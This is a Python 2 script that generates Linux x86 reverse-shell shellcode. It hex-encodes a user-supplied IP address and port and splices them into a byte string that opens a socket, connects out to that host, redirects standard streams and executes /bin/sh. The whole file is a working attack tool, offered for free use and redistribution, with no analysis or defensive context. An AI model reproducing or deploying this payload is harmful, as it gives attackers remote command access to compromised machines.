#!/usr/bin/python

#You are free to use and redistribute this code as you wish

import sys

ip = sys.argv[1].split('.')
port = int(sys.argv[2])

#print '\\x' + str(hex(int(ip[0]))).split('x')[1] + '\\x' + str(hex(int(ip[1]))).split('x')[1] + '\\x' + str(hex(int(ip[2]))).split('x')[1] + '\\x' + str(hex(int(ip[3]))).split('x')[1]

blah = []
blah.append(str(hex(int(ip[0]))).split('x')[1])
blah.append(str(hex(int(ip[1]))).split('x')[1])
blah.append(str(hex(int(ip[2]))).split('x')[1])
blah.append(str(hex(int(ip[3]))).split('x')[1])

#print blah

for i in range(0,4):
	if len(blah[i]) != 2:
		blah[i] = '0' + blah[i]
	blah[i] = '\\x' + blah[i]

#print blah

hex_port = (str(hex(port)).split('x')[1])

second_half = "\\x" + hex_port[2:4]
first_half = "\\x" + hex_port[:2]

#print first_half + ' ' + second_half

shellcode = "\\x31\\xc0\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x31\\xff\\x97\\x31\\xc0\\x31\\xd2\\x52\\x68" + blah[0] + blah[1] + blah[2] + blah[3] +  "\\x66\\x68" + first_half + second_half + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x02\\x89\\xfb\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print shellcode

